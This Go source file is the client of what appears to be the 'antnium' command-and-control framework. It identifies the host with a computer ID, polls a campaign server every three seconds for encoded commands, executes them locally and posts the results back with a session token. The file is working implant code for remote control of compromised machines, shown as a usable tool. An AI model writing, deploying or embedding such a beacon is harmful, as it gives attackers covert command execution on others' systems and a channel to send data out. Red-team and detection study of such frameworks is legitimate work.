package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/dobin/antnium/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoCommandsFound = errors.New("Server did not return any commands")

type Client struct {
	config   ClientConfig
	campgain model.Campaign
	coder    model.Coder

	commandExec CommandExec
}

func NewClient() Client {
	campaign := model.MakeCampgain()
	coder := model.MakeCoder(campaign)

	w := Client{MakeClientConfig(), campaign, coder, MakeCommandExec()}
	return w
}

func (s Client) httpGet(url string) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.campgain.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s Client) httpPost(url string, data *bytes.Reader) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, data)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.campgain.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s Client) Start() {
	s.sendPing()
	for {
		s.requestAndExecute()
		time.Sleep(3 * time.Second)
	}
}

func (s Client) sendPing() {
	arguments := make(model.CmdArgument)
	arguments["msg"] = "ooy!"
	response := make(model.CmdResponse)
	command := model.NewCommand("ping", s.config.ComputerId, "0", arguments, response)
	s.sendCommand(command)
}

func (s Client) requestAndExecute() {
	command, err := s.getCommand()
	if err != nil {
		if err == ErrNoCommandsFound {
			fmt.Print(".")
			return
		}

		log.WithFields(log.Fields{
			"error": err,
		}).Info("Error get command")
		return
	}

	err = s.commandExec.execute(&command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error executing command")
		return
	}

	err = s.sendCommand(command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error sending command")
		return
	}
}

func (s Client) getCommand() (model.CommandBase, error) {
	url := s.campgain.ServerUrl + s.campgain.CommandGetPath + s.config.ComputerId
	resp, err := s.httpGet(url)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.CommandBase{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.CommandBase{}, ErrNoCommandsFound
	}
	command, err := s.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return command, nil
}

func (s Client) sendCommand(command model.CommandBase) error {
	url := s.campgain.ServerUrl + s.campgain.CommandSendPath

	// Setup response
	command.ComputerId = s.config.ComputerId
	json, err := json.Marshal(command)
	if err != nil {
		return err
	}

	log.WithFields(log.Fields{
		"command": string(json),
	}).Info("Send Command")

	data, err := s.coder.EncodeData(command)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := s.httpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
